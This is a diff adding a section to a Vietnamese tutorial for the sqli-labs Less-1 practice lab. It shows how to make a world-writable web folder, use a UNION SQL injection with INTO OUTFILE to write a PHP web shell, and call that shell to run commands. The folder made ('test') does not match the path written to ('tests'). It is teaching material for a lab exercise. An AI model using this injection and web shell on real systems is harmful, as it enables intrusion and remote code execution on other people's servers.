@@ -98,4 +98,25 @@ http://192.168.80.225/sqli-labs/Less-1/?id=1'  union SELECT 1,2,group_concat(Hos
 
 ![](../images/lesson1/screen_12.png)
 
+- INTO OUTFILE
+- Điều kiện để có thể làm được là phải có một thư mục được cấp quyền thực thi 
+```
+[root@centos7 ~]# cd /var/www/html/
+[root@centos7 html]# mkdir test
+[root@centos7 html]# chmod 777 test/
+```
+
+```
+192.168.80.225/sqli-labs/Less-1/?id=1' union select 1,2, "<?php system($_REQUEST['cmd']);?>" INTO OUTFILE '/var/www/html/tests/c.php' --+
+```
+
+![](../images/lesson1/screen_13.png)
+
+- thực hiện remote code 
+```
+192.168.80.225/tests/c.php?cmd=id
+```
+
+![](../images/lesson1/screen_13.png)
+
 Tương tự như thế thì đối với các bảng và các DB khác thì ta truy suất tương tự như thế và thay tên các trường các table các DB mà ta mong muốn. 
